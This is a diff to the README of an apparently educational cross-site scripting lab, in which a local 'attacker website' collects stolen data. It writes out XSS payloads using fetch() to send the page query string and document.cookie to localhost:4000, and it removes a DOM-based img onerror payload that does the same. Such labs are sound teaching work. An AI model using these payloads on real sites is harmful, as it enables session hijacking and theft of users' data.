@@ -32,19 +32,16 @@ This project uses the following technologies:
 6. Point your browser to [http://localhost:4000](http://localhost:4000/) to access the attacker website
 
 
-### Reflected XSS
+### Reflected XSS - Be the hacker
 
-#### Injecting the malicious code:
+1. Inject the malicious code as a review:
 `<script>fetch(`http://localhost:4000?data=${encodeURIComponent(window.location.search)}`)</script>`
+
+2. Open the sample web app in another browser tap and insert a custom review and submit it.
+
+3. How does the attacker website looks like after refreshing the attackers website?
 
 
 ### What if malicious code looks like:
 `<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>`
-
-#### DOM based XSS
-
-#### Injecting the malicious code:
-insert the following string in the search box, and click the Go button:
-
-`<img src="noimage" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)></img>`
 
